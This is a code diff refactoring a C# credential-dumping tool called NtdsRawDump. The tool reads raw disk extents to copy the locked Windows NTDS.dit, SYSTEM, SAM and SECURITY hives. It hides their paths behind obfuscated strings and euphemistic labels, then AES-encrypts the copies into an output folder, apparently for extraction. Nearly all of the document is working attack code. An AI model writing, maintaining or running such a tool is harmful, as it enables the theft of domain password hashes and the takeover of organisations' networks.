@@ -7,6 +7,9 @@ using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
 
+struct Extent { public long PrevVcn, NextVcn, Lcn; }
+struct Target { public string Src, Dst, Label; }
+
 class NtdsRawDump {
     const uint GENERIC_READ                 = 0x80000000;
     const uint FILE_SHARE_RW                = 0x00000003;
@@ -198,7 +201,7 @@ class NtdsRawDump {
 
         pfGetFileSizeEx(hf, out long fileSize);
 
-        var extents = new List<(long prevVcn, long nextVcn, long lcn)>();
+        var extents = new List<Extent>();
         var vcnIn   = new STARTING_VCN { Vcn = 0 };
         var rpBuf   = new byte[65536];
 
@@ -217,12 +220,12 @@ class NtdsRawDump {
             for (uint i = 0; i < extentCount && off + 16 <= (int)ret; i++, off += 16) {
                 long nextVcn = BitConverter.ToInt64(rpBuf, off);
                 long lcn     = BitConverter.ToInt64(rpBuf, off + 8);
-                extents.Add((prev, nextVcn, lcn));
+                extents.Add(new Extent { PrevVcn = prev, NextVcn = nextVcn, Lcn = lcn });
                 prev = nextVcn;
             }
 
             if (ok || err != 234) break;
-            vcnIn.Vcn = extents[extents.Count - 1].nextVcn;
+            vcnIn.Vcn = extents[extents.Count - 1].NextVcn;
         }
         pfCloseHandle(hf);
 
@@ -240,9 +243,9 @@ class NtdsRawDump {
         }
 
         var ms = new MemoryStream();
-        foreach (var (prevVcn, nextVcn, lcn) in extents) {
-            long clusterCount = nextVcn - prevVcn;
-            long byteOffset   = lcn * bpc;
+        foreach (var e in extents) {
+            long clusterCount = e.NextVcn - e.PrevVcn;
+            long byteOffset   = e.Lcn * bpc;
             long byteCount    = clusterCount * bpc;
 
             pfSetFilePointerEx(hv, byteOffset, out _, 0);
@@ -290,21 +293,21 @@ class NtdsRawDump {
         Directory.CreateDirectory(outDir);
 
         var targets = new[] {
-            (S(_path_ntds), S(_out_ntds), "trust anchor database"),
-            (S(_path_sys),  S(_out_sys),  "machine configuration store"),
-            (S(_path_sam),  S(_out_sam),  "account authority store"),
-            (S(_path_sec),  S(_out_sec),  "extended trust policy store"),
+            new Target { Src = S(_path_ntds), Dst = S(_out_ntds), Label = "trust anchor database" },
+            new Target { Src = S(_path_sys),  Dst = S(_out_sys),  Label = "machine configuration store" },
+            new Target { Src = S(_path_sam),  Dst = S(_out_sam),  Label = "account authority store" },
+            new Target { Src = S(_path_sec),  Dst = S(_out_sec),  Label = "extended trust policy store" },
         };
 
         byte[] aesKey = K(_aes_key);
         int ok = 0;
-        foreach (var (src, dst, label) in targets) {
-            Console.Write("[*] Processing " + label + "... ");
-            byte[] data = ReadRaw(dev, src, bpc);
+        foreach (var t in targets) {
+            Console.Write("[*] Processing " + t.Label + "... ");
+            byte[] data = ReadRaw(dev, t.Src, bpc);
             if (data == null) { Console.Error.WriteLine("skip"); continue; }
 
             byte[] enc = AesEncrypt(data, aesKey);
-            string outPath = Path.Combine(outDir, dst);
+            string outPath = Path.Combine(outDir, t.Dst);
             File.WriteAllBytes(outPath, enc);
             Console.WriteLine(data.Length + " bytes");
             ok++;
